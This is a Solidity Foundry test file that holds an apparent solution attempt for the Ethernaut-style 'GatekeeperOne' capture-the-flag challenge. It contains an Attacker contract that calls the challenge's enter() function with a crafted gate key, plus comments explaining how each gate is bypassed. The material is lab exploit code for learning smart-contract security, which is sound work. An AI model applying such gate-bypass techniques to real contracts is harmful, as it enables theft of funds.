// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import { Test, console } from "forge-std/Test.sol";
import { HelperConfig } from "../script/HelperConfig.s.sol";
import { GatekeeperOne } from "../src/13_GatekeeperOne.sol";

contract Attacker {

  GatekeeperOne challenge;

  constructor(address challengeInstanceAddress) {
    challenge = GatekeeperOne(challengeInstanceAddress);
  }

  function attack() public {
    // gateOne = send the tx from another contract
    // gateTwo = gasleft() % 8191 == 0
    // gateThree = uint16(uint160(tx.origin)) as a bytes8 (hex) with the first byte as a 10 instead of 00 to overflow the unint32 and uint16.
    challenge.enter(0x100000000000CDF1);
  }

}
contract GatekeeperOneTest is Test {

  GatekeeperOne challenge;
  Attacker attacker;
  address USER = 0x08f88ef7ecD64a2eA1f3887d725F78DDF1bacDF1;
  
  function setUp() external {
    HelperConfig helperConfig = new HelperConfig();
    address payable challengeInstanceAddress = payable(helperConfig.instances("GatekeeperOne"));
    // uint256 forkId = vm.createFork(vm.envString("SEPOLIA_RPC_URL"));
    // vm.selectFork(forkId);
    challenge = GatekeeperOne(challengeInstanceAddress);
    attacker = new Attacker(challengeInstanceAddress);
  }

  function testRevertWithNoMessage() external {
    vm.prank(USER);
    vm.expectRevert();
    attacker.attack();
  }
}